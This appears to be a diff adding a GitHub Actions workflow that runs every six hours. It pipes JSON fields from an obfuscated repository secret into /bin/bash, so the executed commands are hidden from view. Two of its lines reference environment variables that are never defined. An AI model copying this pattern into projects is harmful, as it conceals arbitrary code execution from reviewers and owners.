@@ -1,0 +1,19 @@
+name: zhaotaiyingfeng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaotaiyingfeng
+        env:
+          uoep64724: ${{ secrets.uoep64724 }}
+        run: |
+          echo $uoep64724 | jq -r .oe5039 | /bin/bash
+          echo $afr4747 | jq -r .fxhb3367 | /bin/bash
+          echo $pon656 | jq -r .d40 | /bin/bash
+
